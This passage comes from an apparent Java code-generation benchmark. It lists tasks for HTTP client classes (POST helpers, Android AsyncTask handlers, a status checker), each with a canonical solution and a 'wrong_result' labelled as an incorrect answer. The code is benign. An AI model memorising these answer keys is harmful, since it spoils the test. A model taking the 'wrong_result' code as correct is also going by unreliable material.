    "Instruction": "Task Description: Create a function that sends an HTTP POST request to a specified URL with a given parameter and returns the response as a string.\n\nFunction Description: The function establishes an HTTP connection to the provided URL, sends a POST request with the specified parameter, reads the response from the server, and returns it as a string. It handles the connection setup, request configuration, data transmission, and response processing.\n\nInput:\n- url (String): The target URL to which the HTTP POST request will be sent.\n- name (String): The parameter value to be sent in the request body (as \"name=[value]\").\n\nOutput:\n- String: The response received from the server as a string. If an error occurs, the function will return an empty string after printing the stack trace.",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\nprivate String sendHttpRequest(String url, String name) {\n    StringBuffer buffer = new StringBuffer();\n    try {\n        HttpURLConnection con = (HttpURLConnection) ( new URL(url)).openConnection();\n        con.setRequestMethod(\"POST\");\n        con.setDoInput(true);\n        con.setDoOutput(true);\n        con.connect();\n        con.getOutputStream().write( (\"name=\" + name).getBytes());\n        \n        InputStream is = con.getInputStream();\n        byte[] b = new byte[1024];\n        \n        while ( is.read(b) != -1)\n            buffer.append(new String(b));\n        \n        con.disconnect();\n    }\n    catch(Throwable t) {\n        t.printStackTrace();\n    }\n    \n    return buffer.toString();\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 16,
    "wrong_result": "```java\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class HttpPostRequest {\n    public static String sendPostRequest(String url, String name) {\n        try {\n            URL obj = new URL(url);\n            HttpURLConnection con = (HttpURLConnection) obj.openConnection();\n            con.setRequestMethod(\"POST\");\n            con.setDoOutput(true);\n            String urlParameters = \"name=\" + name;\n            try (OutputStream os = con.getOutputStream()) {\n                byte[] input = urlParameters.getBytes(\"utf-8\");\n                os.write(input, 0, input.length);\n            }\n            int responseCode = con.getResponseCode();\n            BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));\n            String inputLine;\n            StringBuilder response = new StringBuilder();\n            while ((inputLine = in.readLine()) != null) {\n                response.append(inputLine);\n            }\n            in.close();\n            return response.toString();\n        } catch (Exception e) {\n            e.printStackTrace();\n            return \"\";\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 86,
    "Instruction": "Task Description: Create a Java class that handles HTTP requests asynchronously using HttpURLConnection, with callback functionality for progress updates and post-execution results.\n\nClass Description: HttpRequestHandler is a utility class that provides asynchronous HTTP request capabilities through an inner AsyncTask class. It's designed for Android applications to perform network operations off the main thread and communicate results back through callbacks.\n\nAttributes:\n- callback: HttpRequestCallback - Interface reference for receiving progress updates and final results\n\nMethods:\n- MyAsyncTaskgetNews(HttpRequestCallback) -> Constructor - Initializes the async task with a callback interface\n- doInBackground(String...) -> String - Performs the HTTP request in the background (takes URL as input)\n- onProgressUpdate(String...) -> void - Publishes progress updates to the callback\n- onPostExecute(String) -> void - Notifies callback when execution completes\n\nInterface Methods (HttpRequestCallback):\n- onProgressUpdate(String...) -> void - Called when progress updates are available\n- onPostExecute(String) -> void - Called when the async task completes",
    "Canonical_solution": "import android.os.AsyncTask;\nimport java.io.BufferedInputStream;\nimport java.io.InputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class HttpRequestHandler {\n\n    public interface HttpRequestCallback {\n        void onProgressUpdate(String... progress);\n        void onPostExecute(String result);\n    }\n\n    public static class MyAsyncTaskgetNews extends AsyncTask<String, String, String> {\n        private HttpRequestCallback callback;\n\n        public MyAsyncTaskgetNews(HttpRequestCallback callback) {\n            this.callback = callback;\n        }\n\n        @Override\n        protected String doInBackground(String... params) {\n            try {\n                URL url = new URL(params[0]);\n                HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();\n                urlConnection.setConnectTimeout(7000);\n\n                try {\n                    InputStream in = new BufferedInputStream(urlConnection.getInputStream());\n                    Operations operations = new Operations(); // Context would need to be passed if needed\n                    String NewsData = operations.ConvertInputToStringNoChange(in);\n                    publishProgress(NewsData);\n                } finally {\n                    urlConnection.disconnect();\n                }\n            } catch (Exception ex) {\n                ex.printStackTrace();\n            }\n            return null;\n        }\n\n        @Override\n        protected void onProgressUpdate(String... progress) {\n            if (callback != null) {\n                callback.onProgressUpdate(progress);\n            }\n        }\n\n        @Override\n        protected void onPostExecute(String result) {\n            if (callback != null) {\n                callback.onPostExecute(result);\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class HttpRequestHandler {\n    private HttpRequestCallback callback;\n\n    public HttpRequestHandler(HttpRequestCallback callback) {\n        this.callback = callback;\n    }\n\n    private class MyAsyncTask extends android.os.AsyncTask<String, String, String> {\n        @Override\n        protected String doInBackground(String... urls) {\n            try {\n                java.net.URL url = new java.net.URL(urls[0]);\n                java.net.HttpURLConnection connection = (java.net.HttpURLConnection) url.openConnection();\n                connection.setRequestMethod(\"GET\");\n                connection.setConnectTimeout(5000);\n                connection.setReadTimeout(5000);\n\n                int responseCode = connection.getResponseCode();\n                if (responseCode == java.net.HttpURLConnection.HTTP_OK) {\n                    java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(connection.getInputStream()));\n                    StringBuilder result = new StringBuilder();\n                    String line;\n                    while ((line = reader.readLine()) != null) {\n                        result.append(line);\n                        publishProgress(line);\n                    }\n                    reader.close();\n                    return result.toString();\n                } else {\n                    return \"Error: \" + responseCode;\n                }\n            } catch (Exception e) {\n                return \"Exception: \" + e.getMessage();\n            }\n        }\n\n        @Override\n        protected void onProgressUpdate(String... values) {\n            if (callback != null) {\n                callback.onProgressUpdate(values);\n            }\n        }\n\n        @Override\n        protected void onPostExecute(String result) {\n            if (callback != null) {\n                callback.onPostExecute(result);\n            }\n        }\n    }\n\n    public void getNews(String url) {\n        new MyAsyncTask().execute(url);\n    }\n\n    public interface HttpRequestCallback {\n        void onProgressUpdate(String... progress);\n        void onPostExecute(String result);\n    }\n}"
  },
  {
    "Task_id": 87,
    "Instruction": "Task Description: Create a Java class that implements HTTP client functionality for making network requests, with support for gzip compression, proxy interaction, and error handling.\n\nClass Description: The HttpService class provides HTTP client capabilities for making POST requests to specified endpoints. It handles request construction, connection management, response processing, and includes features like gzip compression, SSL socket configuration, proxy server interaction, and automatic retries for failed requests.\n\nAttributes:\n\nshouldGzipRequestPayload: boolean - Determines whether request payload should be gzip compressed\nMIN_UNAVAILABLE_HTTP_RESPONSE_CODE: int - Minimum HTTP response code considered as service unavailable (500)\nMAX_UNAVAILABLE_HTTP_RESPONSE_CODE: int - Maximum HTTP response code considered as service unavailable (599)\nLOGTAG: String - Tag used for logging messages\nHTTP_OUTPUT_STREAM_BUFFER_SIZE: int - Buffer size for output streams (8192 bytes)\nCONTENT_ENCODING_HEADER: String - Header key for content encoding\nGZIP_CONTENT_TYPE_HEADER: String - Value for gzip content encoding\n\nMethods:\n\nperformRequest: performRequest(String endpointUrl, ProxyServerInteractor interactor, Map<String, Object> params, SSLSocketFactory socketFactory) -> byte[] - Makes an HTTP POST request to the specified endpoint with optional parameters and SSL configuration. Handles retries for failed requests and returns the response body as bytes. Throws ServiceUnavailableException for 5xx responses and IOException for other failures.\n\ngetBufferedOutputStream: getBufferedOutputStream(OutputStream out) -> OutputStream - Creates a buffered output stream, optionally wrapped in a GZIPOutputStream based on shouldGzipRequestPayload.\n\nisProxyRequest: isProxyRequest(String endpointUrl) -> boolean - Determines if the request is a proxy request by checking the endpoint URL.\n\nslurp: slurp(InputStream inputStream) -> byte[] - Reads all bytes from an input stream and returns them as a byte array.",
    "Canonical_solution": "import android.content.Context;\nimport android.net.ConnectivityManager;\nimport android.net.NetworkInfo;\nimport android.net.Uri;\n\nimport java.io.BufferedOutputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.EOFException;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.Map;\nimport java.util.zip.GZIPOutputStream;\n\nimport javax.net.ssl.HttpsURLConnection;\nimport javax.net.ssl.SSLSocketFactory;\n\npublic class HttpService implements RemoteService {\n\n    private final boolean shouldGzipRequestPayload;\n    private static final int MIN_UNAVAILABLE_HTTP_RESPONSE_CODE = HttpURLConnection.HTTP_INTERNAL_ERROR;\n    private static final int MAX_UNAVAILABLE_HTTP_RESPONSE_CODE = 599;\n    private static final String LOGTAG = \"MixpanelAPI.Message\";\n    private static final int HTTP_OUTPUT_STREAM_BUFFER_SIZE = 8192;\n    private static final String CONTENT_ENCODING_HEADER = \"Content-Encoding\";\n    private static final String GZIP_CONTENT_TYPE_HEADER = \"gzip\";\n\n    public HttpService(boolean shouldGzipRequestPayload) {\n        this.shouldGzipRequestPayload = shouldGzipRequestPayload;\n    }\n\n    @Override\n    public byte[] performRequest(String endpointUrl, ProxyServerInteractor interactor, Map<String, Object> params, SSLSocketFactory socketFactory) throws ServiceUnavailableException, IOException {\n        MPLog.v(LOGTAG, \"Attempting request to \" + endpointUrl);\n\n        byte[] response = null;\n        int retries = 0;\n        boolean succeeded = false;\n        while (retries < 3 && !succeeded) {\n            InputStream in = null;\n            OutputStream out = null;\n            OutputStream bout = null;\n            HttpURLConnection connection = null;\n\n            try {\n                final URL url = new URL(endpointUrl);\n                connection = (HttpURLConnection) url.openConnection();\n                if (null != socketFactory && connection instanceof HttpsURLConnection) {\n                    ((HttpsURLConnection) connection).setSSLSocketFactory(socketFactory);\n                }\n\n                if (interactor != null && isProxyRequest(endpointUrl)) {\n                    Map<String,String> headers = interactor.getProxyRequestHeaders();\n                    if (headers != null) {\n                        for (Map.Entry<String, String> entry : headers.entrySet()) {\n                            connection.setRequestProperty(entry.getKey(), entry.getValue());\n                        }\n                    }\n                }\n\n                connection.setConnectTimeout(2000);\n                connection.setReadTimeout(30000);\n                if (null != params) {\n                    Uri.Builder builder = new Uri.Builder();\n                    for (Map.Entry<String, Object> param : params.entrySet()) {\n                        builder.appendQueryParameter(param.getKey(), param.getValue().toString());\n                    }\n                    String query = builder.build().getEncodedQuery();\n                    if (shouldGzipRequestPayload) {\n                        connection.setRequestProperty(CONTENT_ENCODING_HEADER, GZIP_CONTENT_TYPE_HEADER);\n                    } else {\n                        connection.setFixedLengthStreamingMode(query.getBytes().length);\n                    }\n                    connection.setDoOutput(true);\n                    connection.setRequestMethod(\"POST\");\n                    out = connection.getOutputStream();\n                    bout = getBufferedOutputStream(out);\n                    bout.write(query.getBytes(\"UTF-8\"));\n                    bout.flush();\n                    bout.close();\n                    bout = null;\n                    out.close();\n                    out = null;\n                }\n                if (interactor != null && isProxyRequest(endpointUrl)) {\n                    interactor.onProxyResponse(endpointUrl, connection.getResponseCode());\n                }\n                in = connection.getInputStream();\n                response = slurp(in);\n                in.close();\n                in = null;\n                succeeded = true;\n            } catch (final EOFException e) {\n                MPLog.d(LOGTAG, \"Failure to connect, likely caused by a known issue with Android lib. Retrying.\");\n                retries = retries + 1;\n            } catch (final IOException e) {\n                if (connection != null && connection.getResponseCode() >= MIN_UNAVAILABLE_HTTP_RESPONSE_CODE && connection.getResponseCode() <= MAX_UNAVAILABLE_HTTP_RESPONSE_CODE) {\n                    throw new ServiceUnavailableException(\"Service Unavailable\", connection.getHeaderField(\"Retry-After\"));\n                } else {\n                    throw e;\n                }\n            }\n            finally {\n                if (null != bout)\n                    try { bout.close(); } catch (final IOException e) {}\n                if (null != out)\n                    try { out.close(); } catch (final IOException e) {}\n                if (null != in)\n                    try { in.close(); } catch (final IOException e) {}\n                if (null != connection)\n                    connection.disconnect();\n            }\n        }\n        if (retries >= 3) {\n            MPLog.v(LOGTAG, \"Could not connect to Mixpanel service after three retries.\");\n        }\n        return response;\n    }\n\n    private OutputStream getBufferedOutputStream(OutputStream out) throws IOException {\n        if(shouldGzipRequestPayload) {\n          return new GZIPOutputStream(new BufferedOutputStream(out), HTTP_OUTPUT_STREAM_BUFFER_SIZE);\n        } else {\n            return new BufferedOutputStream(out);\n        }\n    }\n\n    private static boolean isProxyRequest(String endpointUrl) {\n        return !endpointUrl.toLowerCase().contains(MIXPANEL_API.toLowerCase());\n    }\n\n    private static byte[] slurp(final InputStream inputStream) throws IOException {\n        final ByteArrayOutputStream buffer = new ByteArrayOutputStream();\n        int nRead;\n        byte[] data = new byte[8192];\n\n        while ((nRead = inputStream.read(data, 0, data.length)) != -1) {\n            buffer.write(data, 0, nRead);\n        }\n\n        buffer.flush();\n        return buffer.toByteArray();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class HttpService {\n    private boolean shouldGzipRequestPayload;\n    private final int MIN_UNAVAILABLE_HTTP_RESPONSE_CODE = 500;\n    private final int MAX_UNAVAILABLE_HTTP_RESPONSE_CODE = 599;\n    private final String LOGTAG = \"HttpService\";\n    private final int HTTP_OUTPUT_STREAM_BUFFER_SIZE = 8192;\n    private final String CONTENT_ENCODING_HEADER = \"Content-Encoding\";\n    private final String GZIP_CONTENT_TYPE_HEADER = \"gzip\";\n\n    public HttpService(boolean shouldGzipRequestPayload) {\n        this.shouldGzipRequestPayload = shouldGzipRequestPayload;\n    }\n\n    public byte[] performRequest(String endpointUrl, ProxyServerInteractor interactor, Map<String, Object> params, SSLSocketFactory socketFactory) throws IOException, ServiceUnavailableException {\n        int retryCount = 0;\n        while (retryCount < 3) {\n            try {\n                HttpURLConnection connection = createConnection(endpointUrl, interactor, socketFactory);\n                if (params != null) {\n                    writeParamsToOutputStream(connection, params);\n                }\n                int responseCode = connection.getResponseCode();\n                if (responseCode >= MIN_UNAVAILABLE_HTTP_RESPONSE_CODE && responseCode <= MAX_UNAVAILABLE_HTTP_RESPONSE_CODE) {\n                    throw new ServiceUnavailableException(\"Service unavailable: \" + responseCode);\n                }\n                InputStream inputStream = connection.getInputStream();\n                return slurp(inputStream);\n            } catch (IOException e) {\n                retryCount++;\n                if (retryCount >= 3) {\n                    throw e;\n                }\n            }\n        }\n        throw new IOException(\"Failed to perform request after multiple retries\");\n    }\n\n    private HttpURLConnection createConnection(String endpointUrl, ProxyServerInteractor interactor, SSLSocketFactory socketFactory) throws IOException {\n        URL url = new URL(endpointUrl);\n        HttpURLConnection connection;\n        if (interactor != null && isProxyRequest(endpointUrl)) {\n            Proxy proxy = interactor.getProxy();\n            connection = (HttpURLConnection) url.openConnection(proxy);\n        } else {\n            connection = (HttpURLConnection) url.openConnection();\n        }\n        if (socketFactory != null) {\n            ((HttpsURLConnection) connection).setSSLSocketFactory(socketFactory);\n        }\n        connection.setRequestMethod(\"POST\");\n        connection.setDoOutput(true);\n        connection.setRequestProperty(CONTENT_ENCODING_HEADER, GZIP_CONTENT_TYPE_HEADER);\n        return connection;\n    }\n\n    private void writeParamsToOutputStream(HttpURLConnection connection, Map<String, Object> params) throws IOException {\n        OutputStream outputStream = getBufferedOutputStream(connection.getOutputStream());\n        String payload = convertParamsToJSON(params);\n        outputStream.write(payload.getBytes());\n        outputStream.flush();\n        outputStream.close();\n    }\n\n    private OutputStream getBufferedOutputStream(OutputStream out) throws IOException {\n        if (shouldGzipRequestPayload) {\n            return new GZIPOutputStream(out, HTTP_OUTPUT_STREAM_BUFFER_SIZE);\n        } else {\n            return new BufferedOutputStream(out, HTTP_OUTPUT_STREAM_BUFFER_SIZE);\n        }\n    }\n\n    private boolean isProxyRequest(String endpointUrl) {\n        return endpointUrl.startsWith(\"http://proxy.\") || endpointUrl.startsWith(\"https://proxy.\");\n    }\n\n    private byte[] slurp(InputStream inputStream) throws IOException {\n        ByteArrayOutputStream buffer = new ByteArrayOutputStream();\n        int bytesRead;\n        byte[] data = new byte[HTTP_OUTPUT_STREAM_BUFFER_SIZE];\n        while ((bytesRead = inputStream.read(data, 0, HTTP_OUTPUT_STREAM_BUFFER_SIZE)) != -1) {\n            buffer.write(data, 0, bytesRead);\n        }\n        return buffer.toByteArray();\n    }\n\n    private String convertParamsToJSON(Map<String, Object> params) {\n        StringBuilder json = new StringBuilder(\"{\");\n        for (Map.Entry<String, Object> entry : params.entrySet()) {\n            json.append(\"\\\"\").append(entry.getKey()).append(\"\\\":\\\"\");\n            json.append(entry.getValue().toString()).append(\"\\\",\");\n        }\n        if (json.length() > 1) {\n            json.setLength(json.length() - 1);\n        }\n        json.append(\"}\");\n        return json.toString();\n    }\n}"
  },
  {
    "Task_id": 88,
    "Instruction": "Task Description: Create a Java utility class for making HTTP requests and handling responses, including JSON parsing and connection management.\n\nClass Description: HttpRequester is a utility class that provides methods for creating HTTP connections, sending requests, and processing responses. It supports handling both successful responses and error streams, with specialized methods for parsing JSON responses. The class manages connection lifecycle and resource cleanup.\n\nAttributes: (None - this is a purely static utility class)\n\nMethods:\n\nMethod1: getConnectionFromRoute(String apiUrl, Route route, String... params) -> HttpURLConnection - Creates an HTTP connection from a route template and parameters. Sets up the connection with proper headers and request method.\n\nMethod2: getConnectionFromCompiledRoute(String apiUrl, Route.CompiledRoute route) -> HttpURLConnection - Creates an HTTP connection from a pre-compiled route. Configures the connection with headers and request method.\n\nMethod3: parseInputStreamAndClose(InputStream inputStream) -> String - Internal method that reads an input stream into a string and closes the stream.\n\nMethod4: parseString(HttpURLConnection connection) -> String - Reads the successful response from a connection into a string.\n\nMethod5: parseStringAndDisconnect(HttpURLConnection connection) -> String - Reads the response into a string and disconnects the connection.\n\nMethod6: parseErrorString(HttpURLConnection connection) -> String - Reads the error stream from a connection into a string.\n\nMethod7: parseErrorStringAndDisconnect(HttpURLConnection connection) -> String - Reads the error stream into a string and disconnects the connection.\n\nMethod8: parseJSONObject(HttpURLConnection connection) -> JSONObject - Parses the response as a JSON object.\n\nMethod9: parseJSONObjectAndDisconnect(HttpURLConnection connection) -> JSONObject - Parses the response as a JSON object and disconnects the connection.\n\nMethod10: parseJSONArray(HttpURLConnection connection) -> JSONArray - Parses the response as a JSON array.\n\nMethod11: parseJSONArrayAndDisconnect(HttpURLConnection connection) -> JSONArray - Parses the response as a JSON array and disconnects the connection.",
    "Canonical_solution": "import org.json.JSONArray;\nimport org.json.JSONException;\nimport org.json.JSONObject;\n\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class HttpRequester {\n\n    public static HttpURLConnection getConnectionFromRoute(String apiUrl, Route route, String... params) throws IOException {\n        return getConnectionFromCompiledRoute(apiUrl, route.compile(params));\n    }\n\n    public static HttpURLConnection getConnectionFromCompiledRoute(String apiUrl, Route.CompiledRoute route) throws IOException {\n        String url = apiUrl + route.getCompiledRoute();\n        HttpURLConnection connection = (HttpURLConnection) new URL(url).openConnection();\n        connection.setFixedLengthStreamingMode(0);\n        connection.setRequestMethod(route.getMethod().name());\n        String agentString = System.getProperty(\"http.agent\")\n                + \"; ReVanced/\" + Utils.getAppVersionName()\n                + \" (\" + Utils.getPatchesReleaseVersion() + \")\";\n        connection.setRequestProperty(\"User-Agent\", agentString);\n        return connection;\n    }\n\n    private static String parseInputStreamAndClose(InputStream inputStream) throws IOException {\n        try (BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream))) {\n            StringBuilder jsonBuilder = new StringBuilder();\n            String line;\n            while ((line = reader.readLine()) != null) {\n                jsonBuilder.append(line);\n                jsonBuilder.append('\\n');\n            }\n            return jsonBuilder.toString();\n        }\n    }\n\n    public static String parseString(HttpURLConnection connection) throws IOException {\n        return parseInputStreamAndClose(connection.getInputStream());\n    }\n\n    public static String parseStringAndDisconnect(HttpURLConnection connection) throws IOException {\n        String result = parseString(connection);\n        connection.disconnect();\n        return result;\n    }\n\n    public static String parseErrorString(HttpURLConnection connection) throws IOException {\n        InputStream errorStream = connection.getErrorStream();\n        if (errorStream == null) {\n            return \"\";\n        }\n        return parseInputStreamAndClose(errorStream);\n    }\n\n    public static String parseErrorStringAndDisconnect(HttpURLConnection connection) throws IOException {\n        String result = parseErrorString(connection);\n        connection.disconnect();\n        return result;\n    }\n\n    public static JSONObject parseJSONObject(HttpURLConnection connection) throws JSONException, IOException {\n        return new JSONObject(parseString(connection));\n    }\n\n    public static JSONObject parseJSONObjectAndDisconnect(HttpURLConnection connection) throws JSONException, IOException {\n        JSONObject object = parseJSONObject(connection);\n        connection.disconnect();\n        return object;\n    }\n\n    public static JSONArray parseJSONArray(HttpURLConnection connection) throws JSONException, IOException {\n        return new JSONArray(parseString(connection));\n    }\n\n    public static JSONArray parseJSONArrayAndDisconnect(HttpURLConnection connection) throws JSONException, IOException {\n        JSONArray array = parseJSONArray(connection);\n        connection.disconnect();\n        return array;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class HttpRequester {\n    public static HttpURLConnection getConnectionFromRoute(String apiUrl, Route route, String... params) throws IOException {\n        String url = route.compile(params);\n        URL urlObj = new URL(apiUrl + url);\n        HttpURLConnection connection = (HttpURLConnection) urlObj.openConnection();\n        connection.setRequestMethod(\"GET\");\n        connection.setRequestProperty(\"Content-Type\", \"application/json\");\n        connection.setRequestProperty(\"Accept\", \"application/json\");\n        return connection;\n    }\n\n    public static HttpURLConnection getConnectionFromCompiledRoute(String apiUrl, Route.CompiledRoute route) throws IOException {\n        URL urlObj = new URL(apiUrl + route.getRoute());\n        HttpURLConnection connection = (HttpURLConnection) urlObj.openConnection();\n        connection.setRequestMethod(\"GET\");\n        connection.setRequestProperty(\"Content-Type\", \"application/json\");\n        connection.setRequestProperty(\"Accept\", \"application/json\");\n        return connection;\n    }\n\n    private static String parseInputStreamAndClose(InputStream inputStream) throws IOException {\n        BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));\n        StringBuilder response = new StringBuilder();\n        String line;\n        while ((line = reader.readLine()) != null) {\n            response.append(line);\n        }\n        reader.close();\n        inputStream.close();\n        return response.toString();\n    }\n\n    public static String parseString(HttpURLConnection connection) throws IOException {\n        int responseCode = connection.getResponseCode();\n        if (responseCode >= 200 && responseCode < 300) {\n            return parseInputStreamAndClose(connection.getInputStream());\n        } else {\n            return parseInputStreamAndClose(connection.getErrorStream());\n        }\n    }\n\n    public static String parseStringAndDisconnect(HttpURLConnection connection) throws IOException {\n        String result = parseString(connection);\n        connection.disconnect();\n        return result;\n    }\n\n    public static String parseErrorString(HttpURLConnection connection) throws IOException {\n        return parseInputStreamAndClose(connection.getErrorStream());\n    }\n\n    public static String parseErrorStringAndDisconnect(HttpURLConnection connection) throws IOException {\n        String result = parseErrorString(connection);\n        connection.disconnect();\n        return result;\n    }\n\n    public static JSONObject parseJSONObject(HttpURLConnection connection) throws IOException, JSONException {\n        String response = parseString(connection);\n        return new JSONObject(response);\n    }\n\n    public static JSONObject parseJSONObjectAndDisconnect(HttpURLConnection connection) throws IOException, JSONException {\n        String response = parseString(connection);\n        connection.disconnect();\n        return new JSONObject(response);\n    }\n\n    public static JSONArray parseJSONArray(HttpURLConnection connection) throws IOException, JSONException {\n        String response = parseString(connection);\n        return new JSONArray(response);\n    }\n\n    public static JSONArray parseJSONArrayAndDisconnect(HttpURLConnection connection) throws IOException, JSONException {\n        String response = parseString(connection);\n        connection.disconnect();\n        return new JSONArray(response);\n    }\n}"
  },
  {
    "Task_id": 89,
    "Instruction": "Task Description: Create a Java class that checks the HTTP status of a given URL and provides information about the response code and any redirection.\n\nClass Description: The HttpStatusChecker class is responsible for making HTTP requests to a specified URL, checking the response status code, and providing information about the response. It handles redirections and provides human-readable messages for the status codes. The class is designed for Android applications, using Android-specific components for logging and resource management.\n\nAttributes:\n- context: Context - The Android context used for accessing resources and system services.\n- url: String - The URL to be checked for HTTP status.\n\nMethods:\n- checkStatus() -> StatusResult - Performs the HTTP request to the specified URL, checks the response code, handles redirections, and returns a StatusResult object containing the status message and redirection URL (if any). This method handles various exceptions and provides appropriate error messages.\n  \n  Nested Class:\n  - StatusResult - A static inner class that holds the result of the HTTP status check.\n    Attributes:\n    - message: String - A human-readable message describing the HTTP status or error.\n    - redirectionUrl: String - The URL to which the original URL redirects (null if no redirection).",
    "Canonical_solution": "import android.content.Context;\nimport android.util.Log;\n\nimport com.trianguloy.urlchecker.utilities.methods.HttpUtils;\n\nimport java.io.IOException;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class HttpStatusChecker {\n\n    private final Context context;\n    private final String url;\n\n    public HttpStatusChecker(Context context, String url) {\n        this.context = context;\n        this.url = url;\n    }\n\n    public StatusResult checkStatus() {\n        String message = null;\n        String redirectionUrl = null;\n\n        HttpURLConnection conn = null;\n        try {\n            // Step 2: Get the access URL\n            Log.d(\"STATUS\", \"Checking: \" + url);\n            \n            // Step 3: Create an HttpURLConnection object\n            conn = (HttpURLConnection) new URL(url).openConnection();\n            \n            // Step 4: Set request parameters\n            conn.setInstanceFollowRedirects(false);\n            conn.setConnectTimeout(HttpUtils.CONNECT_TIMEOUT);\n            \n            // Step 5: Processing Input and Output\n            var responseCode = conn.getResponseCode();\n            Log.d(\"RESPONSE_CODE\", url + \": \" + responseCode);\n\n            var codesArray = context.getResources().getStringArray(R.array.mStatus_codes);\n            for (var s : codesArray) {\n                if (s.startsWith(String.valueOf(responseCode))) {\n                    message = s;\n                    break;\n                }\n            }\n            if (message == null) {\n                message = context.getString(R.string.mStatus_unknownCode, responseCode);\n            }\n\n            var location = conn.getHeaderField(\"Location\");\n            if (location != null) {\n                redirectionUrl = new URL(new URL(url), location).toExternalForm();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n            message = context.getString(R.string.mStatus_ioerror, e.getMessage());\n        } catch (Exception e) {\n            e.printStackTrace();\n            message = context.getString(R.string.mStatus_error, e.getMessage());\n        } finally {\n            // Step 6: Disconnect\n            if (conn != null) {\n                conn.disconnect();\n            }\n        }\n\n        return new StatusResult(message, redirectionUrl);\n    }\n\n    public static class StatusResult {\n        public final String message;\n        public final String redirectionUrl;\n\n        public StatusResult(String message, String redirectionUrl) {\n            this.message = message;\n            this.redirectionUrl = redirectionUrl;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "```java\nimport android.content.Context;\nimport android.util.Log;\n\nimport java.io.IOException;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class HttpStatusChecker {\n    private final Context context;\n    private final String url;\n\n    public HttpStatusChecker(Context context, String url) {\n        this.context = context;\n        this.url = url;\n    }\n\n    public StatusResult checkStatus() {\n        try {\n            URL urlObj = new URL(url);\n            HttpURLConnection connection = (HttpURLConnection) urlObj.openConnection();\n            connection.setInstanceFollowRedirects(false);\n            connection.setRequestMethod(\"HEAD\");\n            int responseCode = connection.getResponseCode();\n\n            String message = \"\";\n            String redirectionUrl = null;\n\n            if (responseCode >= 200 && responseCode < 300) {\n                message = \"Success: \" + responseCode + \" - \" + connection.getResponseMessage();\n            } else if (responseCode >= 300 && responseCode < 400) {\n                redirectionUrl = connection.getHeaderField(\"Location\");\n                message = \"Redirect: \" + responseCode + \" - \" + connection.getResponseMessage();\n            } else if (responseCode >= 400 && responseCode < 500) {\n                message = \"Client Error: \" + responseCode + \" - \" + connection.getResponseMessage();\n            } else if (responseCode >= 500 && responseCode < 600) {\n                message = \"Server Error: \" + responseCode + \" - \" + connection.getResponseMessage();\n            } else {\n                message = \"Unknown Status Code: \" + responseCode;\n            }\n\n            return new StatusResult(message, redirectionUrl);\n        } catch (IOException e) {\n            Log.e(\"HttpStatusChecker\", \"Error checking status for URL: \" + url, e);\n            return new StatusResult(\"Error: \" + e.getMessage(), null);\n        }\n    }\n\n    public static class StatusResult {\n        private final String message;\n        private final String redirectionUrl;\n\n        public StatusResult(String message, String redirectionUrl) {\n            this.message = message;\n            this.redirectionUrl = redirectionUrl;\n        }\n\n        public String getMessage() {\n            return message;\n        }\n\n        public String getRedirectionUrl() {\n            return redirectionUrl;\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 90,
    "Instruction": "Task Description: Create a Java utility class for making HTTP requests using HttpURLConnection, supporting both GET and POST methods asynchronously, with callback mechanisms for handling responses and errors. The class should also include functionality to retrieve network time from a server.\n\nClass Description: HttpURLConnectionUtils is a utility class that provides asynchronous HTTP request capabilities using Java's HttpURLConnection. It supports GET and POST methods, allows setting custom headers, and provides callback interfaces for handling responses and errors. Additionally, it includes functionality to fetch network time from a specified URL.\n\nAttributes:\n- TAG: String - Class tag for logging purposes\n- TIMEOUT_IN_MILLIONS: int - Default timeout for connections in milliseconds (5000ms)\n- BAIDU_URL: String - Default URL for network time requests (https://www.baidu.com)\n\nMethods:\n- doGetAsync(String urlStr, Callback callback) -> void - Performs an asynchronous GET request to the specified URL and invokes the callback with the response or error\n- doPostAsync(String urlStr, String params, Callback callback) -> void - Performs an asynchronous POST request to the specified URL with given parameters and invokes the callback\n- getNetTime(TimeCallback callback) -> void - Retrieves network time from the default BAIDU_URL using the provided callback\n- getNetTime(String urlStr, TimeCallback callback) -> void - Retrieves network time from the specified URL using the provided callback\n- request(String method, String urlStr, Map<String,String> headers, String params, Callback callback) -> void - Internal method that handles the actual HTTP request logic\n- reqNetTime(String urlStr, TimeCallback callback) -> void - Internal method that handles network time retrieval\n\nCallback Interfaces:\n- Callback: \n  - onResponse(String result, long response) -> void - Called when request succeeds\n  - onFail(Throwable error) -> void - Called when request fails\n- TimeCallback:\n  - onResponse(long millis) -> void - Called when network time retrieval succeeds\n  - onFail(Throwable error) -> void - Called when network time retrieval fails",
